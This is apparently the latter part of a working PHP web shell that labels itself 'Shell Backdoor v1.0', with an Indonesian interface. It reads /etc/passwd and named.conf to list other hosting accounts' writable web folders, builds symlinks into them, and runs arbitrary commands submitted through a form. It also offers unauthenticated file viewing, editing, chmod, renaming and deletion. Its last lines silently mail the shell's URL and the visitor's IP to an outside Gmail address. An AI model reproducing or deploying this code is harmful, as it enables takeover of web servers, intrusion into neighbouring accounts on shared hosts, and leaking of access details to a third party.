 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/k0v3T_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }
##JUMPING 
} elseif($_GET['a'] == 'jumping') {
    $i = 0;
    echo "<pre><div class='margin: 5px auto;'>";
    $etc = fopen("/etc/passwd", "r") or die("<font color=white>Can't read /etc/passwd</font>");
    while($passwd = fgets($etc)) {
if($passwd == '' || !$etc) {
    echo "<font color=white>Can't read /etc/passwd</font>";
} else {
    preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
    foreach($user_jumping[1] as $user_idx_jump) {
        $user_jumping_dir = "/home/$user_idx_jump/public_html";
        if(is_readable($user_jumping_dir)) {
            $i++;
            $jrw = "[<font color=#5ddcfc>R</font>] <a href='?dir=$user_jumping_dir'><font color=white>$user_jumping_dir</font></a>";
            if(is_writable($user_jumping_dir)) {
                $jrw = "[<font color=#5ddcfc>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#5ddcfc>$user_jumping_dir</font></a>";
            }
            echo $jrw;
            if(function_exists('posix_getpwuid')) {
                $domain_jump = file_get_contents("/etc/named.conf");   
                if($domain_jump == '') {
                    echo " => ( <font color=red>gagal mengambil nama domain nya</font> )<br>";
                } else {
                    preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                    foreach($domains_jump[1] as $dj) {
                        $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                        $user_jumping_url = $user_jumping_url['name'];
                        if($user_jumping_url == $user_idx_jump) {
                            echo " => ( <u>$dj</u> )<br>";
                            break;
                        }
                    }
                }
            } else {
                echo "<br>";
            }
        }
    }
}
    }
    if($i == 0) {
    } else {
echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
    
    echo "</div></pre>";
		}



//CONFIG

} elseif($_GET['a'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}

//START
} elseif(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo(' <center><textarea style="width:80%;height:50%;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea></center>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br />'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#5ddcfc">Ganti  Permission Berhasil </font><br />';
}else{
echo '<font color="White">Ganti Permission Gagal </font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Chmod" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="#5ddcfc">Ganti Nama Berhasil </font><br />';
}else{
echo '<font color="RED">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
Nama Baru : <input name="newname" type="text" size="30" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Ubah Nama" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#5ddcfc">Edit File Berhasil Gan</font><br />';
}else{
echo '<font color="RED">Edit File Gagal Gan</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=140 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Edit File" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="#5ddcfc">Hapus Dir Berhasil Gan</font><br />';
}else{
echo '<font color="red">Hapus Dir Gagal Gan</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="#5ddcfc">Hapus File Berhasil Gan</font><br />';
}else{
echo '<font color="#red">Hapus File Gagal Gan</font><br />';
}
}
}
		
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700px" border="0" cellpadding="4" cellspacing="1" align="center">
<tr class="first">
<b><td><center><font color=black size=3>Name</font></center></td></b>
<b><td><center><font color=black size=3>Size</font></center></td></b>
<b><td><center><font color=black size=3>Permissions</font></center></td></b>
<b><td><center><font color=black size=3>Options</font></center></td></b>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>
<a href=\"?path=$path/$dir\"><font color=red>$dir</font></a></td>
<td><center><font color=red>Directory</font></center></td>
<td><center>";
	
if(is_writable("$path/$dir")) echo '<font color="#5ddcfc">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"Select\">Select</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='>
<a href=\"?filesrc=$path/$file&path=$path\"><font color=red>$file</font></a></td>
<td><center><font color=Red>".$size."</font></center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color=#5ddcfc>';
elseif(!is_readable("$path/$file")) echo '<font color=red>';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"Select\">Select</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br /><center><font size=3 ; color=White> Shell Backdoor v1.0<br><font size=4 ; color=#5ddcfc>Copyright &copy; <font color="White">By Setiaji.id</font></br>

</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
// Masukan password dahulu
return $info;
}
$cek = 'cyber0spacex@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$ip = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($cek, "Berhasil", $ip, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
    
